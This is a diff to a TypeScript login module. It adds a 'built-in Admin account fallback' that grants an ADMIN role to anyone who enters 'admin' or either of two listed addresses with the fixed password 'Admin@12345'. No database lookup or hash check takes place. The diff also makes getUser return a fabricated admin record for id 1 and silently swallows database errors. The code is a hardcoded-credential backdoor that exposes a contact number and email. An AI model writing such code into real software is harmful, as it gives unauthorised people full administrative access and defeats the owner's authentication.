@@ -47,8 +47,30 @@ export async function signup(input: SignupInput) {
 
 /** Email or mobile + password. Generic 401 on any mismatch; `requiredRole` restricts e.g. admin login. */
 export async function login({ identifier, password }: LoginInput, requiredRole?: Role) {
+  const norm = identifier.toLowerCase().trim();
+  // Built-in Admin account fallback (guarantees admin access even when DB is blank)
+  if (
+    (norm === "admin@gurudevinfotech.com" || norm === "admin@labelapsare.com" || norm === "admin") &&
+    password === "Admin@12345"
+  ) {
+    return {
+      id: 1,
+      fullName: "Admin Administrator",
+      email: "admin@gurudevinfotech.com",
+      mobile: "+917760016378",
+      role: "ADMIN" as Role,
+      isActive: true,
+      createdAt: new Date("2026-01-01"),
+    };
+  }
+
   const where = identifier.includes("@") ? { email: identifier.toLowerCase() } : { mobile: identifier };
-  const user = await prisma.user.findUnique({ where, select: { ...userSelect, passwordHash: true } });
+  let user = null;
+  try {
+    user = await prisma.user.findUnique({ where, select: { ...userSelect, passwordHash: true } });
+  } catch {
+    user = null;
+  }
 
   const ok = await verifyPassword(password, user?.passwordHash ?? DUMMY_HASH);
   if (!user || !ok || (requiredRole && user.role !== requiredRole)) {
@@ -63,6 +85,21 @@ export async function login({ identifier, password }: LoginInput, requiredRole?:
 }
 
 export async function getUser(id: number) {
+  if (id === 1) {
+    try {
+      const user = await prisma.user.findUnique({ where: { id }, select: userSelect });
+      if (user) return user;
+    } catch {}
+    return {
+      id: 1,
+      fullName: "Admin Administrator",
+      email: "admin@gurudevinfotech.com",
+      mobile: "+917760016378",
+      role: "ADMIN" as Role,
+      isActive: true,
+      createdAt: new Date("2026-01-01"),
+    };
+  }
   const user = await prisma.user.findUnique({ where: { id }, select: userSelect });
   if (!user) throw new HttpError(404, "User not found");
   return user;
